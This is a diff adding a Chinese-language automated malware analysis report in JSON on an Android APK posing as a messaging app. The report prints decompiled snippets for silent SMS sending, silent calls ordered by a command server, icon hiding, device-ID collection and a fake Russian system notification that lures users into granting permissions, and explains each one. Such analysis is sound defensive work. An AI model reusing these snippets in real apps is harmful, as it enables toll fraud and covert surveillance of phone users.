@@ -1,0 +1,183 @@
+{
+  "APK信息": {
+    "文件名": "68338ecc35ecbe80d765d925e8ec2d2aa850d3e413288b990cbc0fd1a8af22f4.apk",
+    "sha256": "68338ecc35ecbe80d765d925e8ec2d2aa850d3e413288b990cbc0fd1a8af22f4",
+    "包名": "ru.glare.snuggle",
+    "应用名": "Соoбщениe",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 175.5
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lru\\glare\\snuggle\\b;",
+          "method_signature": "a(String str, String str2, PendingIntent pendingIntent)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public static void a(String str, String str2, PendingIntent pendingIntent) {\n    try {\n        SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n    } catch (Exception e) {\n    }\n}",
+          "malicious_code_snippet_context": "          }\n      }\n  \n>>>     public static void a(String str, String str2, PendingIntent pendingIntent) {\n>>>         try {\n>>>             PredictionContribution.a(true);\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n>>>         } catch (Exception e) {\n>>>         }\n      }\n  \n      public static boolean a(Context context) {",
+          "behavior_description": "该方法接收目标号码(str)和短信内容(str2)作为参数，通过 SmsManager.getDefault().sendTextMessage() 在无任何用户交互的情况下静默发送短信。结合同类中检查自身是否为默认短信应用(Build.VERSION.SDK_INT < 19 || \"ru.glare.snuggle\".equals(Telephony.Sms.getDefaultSmsPackage(context)))以及每60秒循环触发的 AlarmManager 定时任务，表明该恶意软件会周期性地向指定号码（通常为增值服务号码或C2下发的号码）静默发送短信，用于短信欺诈或订阅扣费服务，直接造成用户经济损失。数据流向：外部传入的目标号码与短信内容(参数) → SmsManager.sendTextMessage() 静默发送。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "ANDROID_ID"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lru\\glare\\snuggle\\b;",
+          "method_signature": "e(Context context)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "public static String e(Context context) {\n    return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n}",
+          "malicious_code_snippet_context": "          return false;\n      }\n  \n>>>     public static String e(Context context) {\n>>>         return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n>>>     }\n  }",
+          "behavior_description": "该方法位于混淆包名 ru.glare.snuggle 下的类中，通过 Settings.Secure.getString 读取系统安全设置中的设备唯一标识符 ANDROID_ID，用于设备指纹采集。结合厂商报告确认该样本为伪装成短信应用、滥用 AccessibilityService 的间谍类恶意软件，该标识符大概率被用于唯一标识和跟踪受害设备，并可能随其他窃取数据一同上报至远端服务器。数据流向：设备安全设置存储（ANDROID_ID）→ 恶意指纹采集方法 e() 读取并返回 → 供上层恶意模块进行受害者设备识别与追踪。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lru\\glare\\snuggle\\Contract;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 26)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (Build.VERSION.SDK_INT >= 26) {\n    ((NotificationManager) getSystemService(\"notification\")).createNotificationChannel(new NotificationChannel(\"ru.glare.snuggle.SIP\", \"Attention\", 1));\n    builder = new Notification.Builder(getApplicationContext(), \"ru.glare.snuggle.SIP\");\n} else {\n    builder = new Notification.Builder(getApplicationContext());\n}\nbuilder.setSmallIcon(android.R.drawable.ic_dialog_info).setContentTitle(\"Оcновнoй прoцеcс\").setContentText(\"Системa нe кoрректнo рабoтaет, вaм нeобходимo включить доcтуп к cтатиcтике для 'Оcновнoй прoцеcс'\");\nstartForeground(1874, builder.build());",
+          "malicious_code_snippet_context": "          if (e.f10a) {\n              System.out.println(\"\");\n          }\n>>>         if (Build.VERSION.SDK_INT >= 26) {\n>>>             ((NotificationManager) getSystemService(\"notification\")).createNotificationChannel(new NotificationChannel(\"ru.glare.snuggle.SIP\", \"Attention\", 1));\n>>>             builder = new Notification.Builder(getApplicationContext(), \"ru.glare.snuggle.SIP\");\n>>>         } else {\n>>>             builder = new Notification.Builder(getApplicationContext());\n>>>         }\n>>>         builder.setSmallIcon(android.R.drawable.ic_dialog_info).setContentTitle(\"Оcновнoй прoцеcс\").setContentText(\"Системa нe кoрректнo рабoтaет, вaм нeобходимo включить доcтуп к статиcтике для 'Оcновнoй прoцеcс'\").setWhen(System.currentTimeMillis());\n>>>         startForeground(1874, builder.build());\n      }\n  \n      @Override // android.app.Service",
+          "behavior_description": "该代码位于恶意样本的 Service 组件中，通过 startForeground(1874, ...) 将自身提升为前台服务实现持久化保活，防止进程被系统回收。同时构造了一条伪装成系统错误提示的俄语欺骗性通知（标题'Оcновнoй прoцеcс'即'主进程'，内容谎称'系统运行不正常，您需要为主进程开启统计信息访问权限'），持续向用户展示社工诱导信息，诱骗用户为木马授予 UsageStats/无障碍等敏感权限。数据流向：硬编码的俄语欺骗性文本 → Notification.Builder 构建伪装系统通知 → startForeground() 前台保活并常驻通知栏展示诱导内容。结合厂商报告确认该样本是伪装成'Сообщениe(短信)'、滥用 AccessibilityService 的间谍木马，此前台服务是其长期驻留和社工诱导用户授权的关键持久化环节。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.CALL_PHONE"
+            ],
+            "字符串": [
+              "android.intent.action.CALL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lru\\glare\\snuggle\\Margin;",
+          "method_signature": "b(Context context, String str)",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Uri uri = Uri.parse(\"tel:\" + str);\nIntent intent = new Intent(\"android.intent.action.CALL\", uri);\nintent.addFlags(268435456);\ncontext.startActivity(intent);",
+          "malicious_code_snippet_context": "          System.out.println(\"command7() called with: number = [\" + str + \"]\");\n          try {\n              PredictionContribution.a(true);\n>>>             Uri uri = Uri.parse(\"tel:\" + str);\n>>>             System.out.println(String.format(\"command7: %s\", uri.toString()));\n>>>             Intent intent = new Intent(\"android.intent.action.CALL\", uri);\n>>>             intent.addFlags(268435456);\n              context.startActivity(intent);\n              return 0;\n          } catch (Exception e) {",
+          "behavior_description": "该方法是恶意软件的远程指令处理器（日志显示为command7），在IntentService的onHandleIntent中被调用。它接收外部传入的电话号码字符串，构造tel: URI后通过ACTION_CALL Intent直接发起电话呼叫。关键点在于使用的是ACTION_CALL而非ACTION_DIAL：ACTION_DIAL仅调起拨号界面等待用户确认，而ACTION_CALL配合CALL_PHONE权限可无需任何用户交互直接拨出电话。数据流向：C2服务器下发指令→IntentService接收并解析→command7携带目标号码→Uri.parse(\"tel:\"+str)→startActivity(ACTION_CALL)静默拨号。攻击者可远程控制受害设备拨打高额费率号码实施资费消耗欺诈，或拨打攻击者指定号码将设备变为窃听工具。结合该样本滥用AccessibilityService隐藏自身的背景，此行为属于典型的远程控制恶意功能。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lru\\glare\\snuggle\\Present;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 26)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Win.class), 2, 1);",
+          "malicious_code_snippet_context": "          this.b.acquire();\n          b.b(getApplicationContext());\n          f3a.post(this.c);\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Win.class), 2, 1);\n      }\n  }",
+          "behavior_description": "该代码通过 PackageManager.setComponentEnabledSetting() 将应用自身的组件 Win.class（主入口/Launcher Activity）设置为 COMPONENT_ENABLED_STATE_DISABLED（参数2），使应用图标从桌面启动器中消失，用户无法正常看到和卸载应用。同时该段代码还注册了 SMS_RECEIVED 和 PHONE_STATE 广播接收器用于拦截短信和来电状态，并获取 WakeLock 保持设备唤醒以实现后台驻留。数据流向：硬编码的自身组件名 Win.class → setComponentEnabledSetting() 禁用组件实现图标隐藏，配合短信监听和唤醒锁在用户无感知的情况下持续潜伏运行。这与厂商报告中该样本伪装成'Сообщениe（Messages）'并隐藏自身以监视受害者的行为完全吻合。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
